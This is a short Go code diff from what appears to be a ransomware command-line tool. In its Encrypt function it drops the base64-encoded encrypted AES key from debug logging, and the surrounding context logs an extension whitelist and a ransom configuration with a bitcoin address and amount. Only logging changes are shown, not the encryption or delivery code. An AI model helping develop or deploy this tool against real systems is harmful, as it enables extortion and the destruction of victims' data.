@@ -2,7 +2,6 @@ package cli
 
 import (
 	"crypto/rsa"
-	"encoding/base64"
 	"errors"
 	"fmt"
 	"log/slog"
@@ -133,10 +132,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 		"whitelist", extWhitelist,
 		"skipHidden", skipHidden,
 	)
-	slog.Debug("Encrypted AES key",
-		"keySize", len(encryptedAesKey),
-		"base64Key", base64.StdEncoding.EncodeToString(encryptedAesKey),
-	)
+	slog.Debug("Encrypted AES key", "keySize", len(encryptedAesKey))
 	slog.Debug("Ransom configuration",
 		"bitcoinAddress", bitcoinAddress,
 		"bitcoinCount", bitcoinCount,
